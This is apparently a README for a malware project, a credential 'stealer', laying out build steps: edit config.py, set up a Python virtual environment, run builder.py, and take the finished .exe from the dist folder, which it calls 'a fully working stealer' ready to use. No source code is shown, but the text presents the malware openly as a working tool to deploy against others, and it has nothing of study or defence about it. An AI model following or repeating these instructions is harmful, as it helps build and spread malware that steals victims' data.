**1. First, you must change the fields in the config.py file to the correct ones**
**2. First you need to create a virtual environment (venv)**
```
python3 -m venv venv
```
**3. Then you have to activate it**
```
venv/Scripts/Activate1.ps if you using powershell (now windows terminal) or venv/Scripts/activate.bat if using a cmd
```
**4. Run builder.py and build a .exe file**
```
python3 builder.py
```
**5. Final step**
*You have a folder dist, in it is your .exe file, this is a fully working stealer that you can already work with*

There are builder .exe files in this stealer, to create the .exe file you must run builder.py.
